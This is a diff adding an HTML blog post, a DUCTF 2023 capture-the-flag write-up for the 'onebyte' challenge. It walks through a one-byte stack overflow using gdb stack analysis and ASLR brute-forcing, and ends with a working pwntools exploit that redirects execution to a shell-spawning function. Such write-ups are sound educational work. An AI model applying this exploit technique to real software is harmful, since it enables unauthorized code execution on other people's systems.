@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>DUCTF 2023 writeup for ‘onebyte’ | halcyondream</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="DUCTF 2023 writeup for ‘onebyte’" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This writeup will explain how to exploit the “onebyte” CTF challenge." />
+<meta property="og:description" content="This writeup will explain how to exploit the “onebyte” CTF challenge." />
+<link rel="canonical" href="http://localhost:4000/2023/09/19/onebyte-writeup.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/19/onebyte-writeup.html" />
+<meta property="og:site_name" content="halcyondream" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-19T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="DUCTF 2023 writeup for ‘onebyte’" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-09-19T00:00:00-04:00","datePublished":"2023-09-19T00:00:00-04:00","description":"This writeup will explain how to exploit the “onebyte” CTF challenge.","headline":"DUCTF 2023 writeup for ‘onebyte’","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/19/onebyte-writeup.html"},"url":"http://localhost:4000/2023/09/19/onebyte-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="halcyondream" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">halcyondream</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">DUCTF 2023 writeup for &#39;onebyte&#39;</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-09-19T00:00:00-04:00" itemprop="datePublished">Sep 19, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This writeup will explain how to exploit the “onebyte” CTF challenge.</p>
+
+<blockquote>
+  <p><em>Here’s a one byte buffer overflow!</em></p>
+</blockquote>
+
+<h1 id="static-analysis">Static analysis</h1>
+
+<p>Start with the C source code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="n">win</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+		<span class="p">...</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Free junk: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init</span><span class="p">);</span>
+		<span class="p">...</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Let’s analyze some key information:</p>
+
+<ul>
+  <li>The print statement will yield the address of the <em>init</em> function</li>
+  <li>A buffer <em>buf</em> is declared with 16 bytes</li>
+  <li>The insecure <em>read</em> function will set 17 bytes into <em>buf</em></li>
+  <li>The <em>win</em> function will launch a shell, although the application does not call this function directly</li>
+</ul>
+
+<p>With this information, we can infer a few things:</p>
+
+<ul>
+  <li>If we can call <em>win</em>, we will gain a shell, and presumably gain the flag. This saves us the legwork of crafting shellcode ourselves.</li>
+  <li>We can leverage the <em>read</em> function call to overflow one byte outside of <em>buf</em>.</li>
+  <li>Using static or dynamic analysis, we can get the address of <em>win</em> by adding the offset of <em>init</em> - <em>win</em> to the address given in the “free junk” output from the <em>printf</em> call.</li>
+</ul>
+
+<p>Observe the disassembly:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb onebyte
+...
+(gdb) disas main
+</code></pre></div></div>
+
+<p>Let’s trim it down to the parts that matter for the exploit:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ...
+   0x00001239 &lt;+11&gt;:	mov    ebp,esp
+   0x0000123b &lt;+13&gt;:	push   ebx
+   0x0000123c &lt;+14&gt;:	push   ecx
+   0x0000123d &lt;+15&gt;:	sub    esp,0x10
+   ...
+   0x00001280 &lt;+82&gt;:	lea    eax,[ebp-0x18]
+   0x00001283 &lt;+85&gt;:	push   eax
+   ...
+   0x00001286 &lt;+88&gt;:	call   0x1050 &lt;read@plt&gt;
+   ...
+   0x00001293 &lt;+101&gt;:	lea    esp,[ebp-0x8]
+   0x00001296 &lt;+104&gt;:	pop    ecx
+	 ...
+   0x00001299 &lt;+107&gt;:	lea    esp,[ecx-0x4]
+   0x0000129c &lt;+110&gt;:	ret
+</code></pre></div></div>
+
+<p>Now, let’s walk through the behavior of the stack. Start with the function prologue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;+11&gt;:	mov    ebp,esp
+&lt;+13&gt;:	push   ebx
+&lt;+14&gt;:	push   ecx
+&lt;+15&gt;:	sub    esp,0x10
+</code></pre></div></div>
+
+<p>First, the base pointer <em>EBP</em> is 24 bytes below the stack pointer <em>ESP</em>. The lowest 16 bytes are allocated for local variables. Based on the C code, we can infer that this space is reserved only for the 16-byte buffer, <em>buf</em>. We can also infer that the original value of ECX is located at <em>EBP</em>-8.</p>
+
+<p>Next, at <em>main</em>+82 and 86, the 16-byte variable <em>buf</em> is set as the second parameter to <em>read</em>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;+82&gt;:	lea    eax,[ebp-0x18]
+&lt;+85&gt;:	push   eax
+...
+&lt;+88&gt;:	call   0x1050 &lt;read@plt&gt;
+</code></pre></div></div>
+
+<p>So, <em>buf</em> is at <em>EBP</em>-0x18, or <em>EBP</em>-24. This aligns with our analysis of the prologue.</p>
+
+<p>At <em>main</em>+101 and 104, ECX is set to its original value, at <em>EBP</em>-8.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;+101&gt;:	lea    esp,[ebp-0x8]
+&lt;+104&gt;:	pop    ecx
+</code></pre></div></div>
+
+<p>Note that this is lined up against the end of the 16-byte <em>buf</em>. Also recall that <em>EPB</em>-8 is exactly where the one-byte overflow would occur.</p>
+
+<p>Finally, the return address is determined in the last two lines:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;+107&gt;:	lea    esp,[ecx-0x4]
+&lt;+110&gt;:	ret
+</code></pre></div></div>
+
+<p>Observe that the stack pointer is set to whatever data exists at <em>ECX</em>-4. When the function returns at <em>main</em>+110, the program will try to jump to that location and execute any assembly there. If a function exists there, the application will execute it.</p>
+
+<p>(Note: If you’re interested in the LEA and ECX behaviors here, read my previous blog post on this topic. In short, it’s related to stack alignment. You’re likely to see this behavior in 32-bit GCC builds. You are not likey to see it in 64-bit GCC builds. For the purpose of CTF exercises, the big takeaway is that, for some 32-bit GCC builds, there’s a four-byte offset that you will need to account for whenever you deploy a payload that’s intended to exploit the return behavior.)</p>
+
+<p>Finally, since we have an intution about the use of the “free junk” (the location of <em>init</em>), let’s see where the two line up:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) info functions
+...
+0x000011bd  init
+0x00001203  win
+0x0000122e  main
+...
+</code></pre></div></div>
+
+<p>Note that <em>0x1203</em> - <em>0x11bd</em> = 70, or <em>0x46</em>. So, <em>init</em>+70 should always point to the location of <em>win</em>.</p>
+
+<h1 id="dynamic-analysis">Dynamic analysis</h1>
+
+<p>The methodology is simple:</p>
+
+<ul>
+  <li>Observe the stack after our one-byte overflow</li>
+  <li>Try to infer if there’s a way to control where the function returns</li>
+</ul>
+
+<p>If we run the application many times, we will get a different location of <em>init</em> (the “free junk”). This tells us that ASLR may affect our exploit. With that said, observe that <em>init</em>+70 will always match the location of <em>win</em>.</p>
+
+<p>Let’s set some breakpoints:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas main
+   ...
+   0x0000128b &lt;+93&gt;:	add    esp,0x10
+   ...
+   0x00001299 &lt;+107&gt;:	lea    esp,[ecx-0x4]
+   0x0000129c &lt;+110&gt;:	ret
+End of assembler dump.
+(gdb) b *(main+93)
+Breakpoint 1 at 0x128b
+(gdb) b *(main+107)
+Breakpoint 2 at 0x1299
+(gdb) b *(main+110)
+Breakpoint 3 at 0x129c
+</code></pre></div></div>
+
+<p>Run the program with 17-byte input.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) run
+Starting program: /home/kali/onebyte 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Free junk: 0x565561bd
+Your turn: AAAABBBBCCCCDDDDE
+
+Breakpoint 1, 0x5655628b in main ()
+(gdb) 
+</code></pre></div></div>
+
+<p>Analyze the data in the stack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/1i $pc
+=&gt; 0x5655628b &lt;main+93&gt;:	add    esp,0x10
+(gdb) x/8wx $ebp-0x18
+0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
+0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
+(gdb) x/wx $ebp-0x8
+0xffffd460:	0xffffd445
+</code></pre></div></div>
+
+<p>We can see that all 17 bytes were set, with the final byte, 0x45 (“E”), overflowing into the least-significant byte at <em>EBP</em>-8.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) continue
+Continuing.
+
+Breakpoint 2, 0x56556299 in main ()
+(gdb) x/1i $pc
+=&gt; 0x56556299 &lt;main+107&gt;:	lea    esp,[ecx-0x4]
+(gdb) i r ecx
+ecx            0xffffd445          -11195
+(gdb) x/x $ecx
+0xffffd445:	0x11ffffd4
+(gdb) x/x $ecx-0x4
+0xffffd441:	0x50000000
+</code></pre></div></div>
+
+<p>Here, note that ECX is set with the overflow bit. Also observe that the current instruction will, after execution, set the stack whatever value is at <em>ECX</em>-0x4. Let’s confirm this now.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) ni
+
+Breakpoint 3, 0x5655629c in main ()
+(gdb) x/1i $pc
+=&gt; 0x5655629c &lt;main+110&gt;:	ret
+(gdb) i r ecx
+ecx            0xffffd445          -11195
+(gdb) i r esp
+esp            0xffffd441          0xffffd441
+(gdb) x/x $esp
+0xffffd441:	0x50000000
+</code></pre></div></div>
+
+<p>Recall that RET will pop the stack into the instruction pointer (literally <code class="language-plaintext highlighter-rouge">pop eip</code>) and then try to execute any instructions at that location. However, since we have indirectly manipulated ESP to an arbitrary value (0x45 - 0x4 = 0x41), the program may jump to an arbitrary location in memory. Again, let’s confirm this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) ni
+0x50000000 in ?? ()
+(gdb) ni
+
+Program received signal SIGSEGV, Segmentation fault.
+0x50000000 in ?? ()
+</code></pre></div></div>
+
+<p>If we controlled the stack correctly, this would actually try to execute <em>0x41414141</em>, the “AAAA” sequence from our payload. If we can manipulate the stack to do this, we should also be able to execute the location of <em>win</em>.</p>
+
+<p>Let’s see what we <em>can</em> do with the stack.</p>
+
+<h1 id="controlling-the-stack">Controlling the stack</h1>
+
+<p>Revisit the stack addresses and data at <em>main</em>+93, right after we set the overflow:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/8wx $ebp-0x18
+0xffffd450:	0x41414141	0x42424242	0x43434343	0x44444444
+0xffffd460:	0xffffd445	0xf7e1dff4	0x00000000	0xf7c237c5
+</code></pre></div></div>
+
+<p>Observe the following:</p>
+
+<ul>
+  <li>ESP is eventually set to <em>0xffffd445</em> - 4</li>
+  <li>However, our target address is <em>0xffffd450</em></li>
+</ul>
+
+<p>In hindsight, if we had set <em>0x50</em> instead of <em>0x45</em> (“E”) as the overflow byte, <em>ESP</em> would have jumped to our target. Of course, ASLR will make it impossible to predict exactly which address in the stack we will need to target on any execution. However, we <em>do</em> have control over that one byte.</p>
+
+<p>To see what exactly the stack is doing, let’s write a simple GDB script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set disable-randomization off
+set pagination off
+b *(main+93)
+run &lt; &lt;(echo 'AAAABBBBCCCCDDDDE')
+echo [Analyze EBP-0x18 ...]\n
+x/1i $pc
+x/8wx $ebp-0x18
+continue
+quit
+</code></pre></div></div>
+
+<p>Then run it in a loop.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ for i in {1..5}; do gdb -x onebyte.gdb ~/onebyte | grep 0x41414141; done
+0xffa7c880:	...
+0xffe3a0e0:	...
+0xff9c72b0:	...
+0xffa12d80:	...
+0xffb26a30:	...
+</code></pre></div></div>
+
+<p>Notice that, on each execution, the target stack address is a power of 10 in base 16: 80, e0, b0, 30, and so forth. Run it enough, and you’ll get one that ends in 40, like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xff8ab340
+</code></pre></div></div>
+
+<p>We know that we can control the value of that byte. We also know that, at <em>main</em>+107, the value of the byte we send is subtracted by 4. So, if the overflow byte is <em>0x44</em> (“D”), we should be able to point to the target stack address.</p>
+
+<p>Let’s modify the payload and automate it in the GDB script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run &lt; &lt;(echo 'AAAABBBBBBBBBBBBD')
+</code></pre></div></div>
+
+<p>The “D” should resolve to 0x40, thus targeting the “AAAA” on the stack. Modify the <em>grep</em> command to catch the message that displays if <em>0x41414141</em> is executed. Run this until you see results.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ for i in {1..10}; do gdb -x onebyte.gdb ~/onebyte | grep '0x41414141 in \?\?'; done
+0x41414141 in ?? ()
+</code></pre></div></div>
+
+<p>So, given enough iterations, we can redirect control to the stack. Further, this took fewer than 10 attempts. On average, this challenge can be completed in under 30 attempts.</p>
+
+<p>The next step is replacing the target with the address of <em>win</em>.</p>
+
+<h1 id="solution">Solution</h1>
+
+<p>Here’s a working solution:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Free junk: 0x"</span><span class="p">)</span>
+    <span class="n">init_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">win_address</span> <span class="o">=</span> <span class="n">init_address</span> <span class="o">+</span> <span class="mi">70</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">win_address</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x44</span><span class="s">"</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">bruteforce</span><span class="p">(</span><span class="n">binary_path</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">match</span><span class="p">):</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">match</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+                <span class="n">flag</span> <span class="o">=</span> <span class="n">response</span>
+        <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+            <span class="k">pass</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">flag</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">(</span><span class="s">"/home/kali/onebyte"</span><span class="p">,</span> <span class="s">"whoami"</span><span class="p">,</span> <span class="s">"kali"</span><span class="p">))</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">pass</span> 
+</code></pre></div></div>
+
+<p>Output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 onebyte.py
+[+] Starting local process '/bin/sh': pid 201818
+[*] Stopped process '/bin/sh' (pid 201818)
+[+] Starting local process '/bin/sh': pid 201821
+[*] Stopped process '/bin/sh' (pid 201821)
+...
+Your turn: kali
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/2023/09/19/onebyte-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">halcyondream</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">halcyondream</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/halcyondream"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">halcyondream</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Portfolio for Cybersecurity projects, research, and developments.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
